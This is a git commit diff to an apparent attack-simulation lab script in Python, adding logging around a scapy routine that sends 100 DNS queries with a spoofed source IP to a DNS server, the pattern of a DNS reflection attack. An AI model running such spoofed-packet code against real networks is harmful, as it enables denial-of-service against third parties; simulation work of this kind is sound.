1a16af5a9a420f660b15e5cd4266762019499e3a
Once-a-deadcat <catgorogoro994@gmail.com>
2023-11-25 21:16:46 +0900

    [modfiy] log volumes settings

--- attack-simulation/attack-scripts/example-attack-script.py
+++ attack-simulation/attack-scripts/example-attack-script.py
@@ -1,5 +1,9 @@
 # 攻撃シミュレーションスクリプト
 import scapy.all as scapy
+import logging
+
+# ログ設定
+logging.basicConfig(filename='/var/log/attack-simulation.log', level=logging.INFO)
 
 def dns_reflection_attack():
     # DNSサーバーと偽装された攻撃者IPアドレス
@@ -9,7 +13,11 @@ def dns_reflection_attack():
     # DNSリクエストの作成
     dns_request = scapy.IP(src=spoofed_ip, dst=target_dns) / scapy.UDP() / scapy.DNS(qd=scapy.DNSQR(qname="example.com"))
 
+    # 攻撃の開始
+    logging.info("Attack simulation started.")
     # 攻撃の実行
     scapy.send(dns_request, count=100)
+    # ログの記録
+    logging.info("Attack simulation executed.")
 
 dns_reflection_attack()
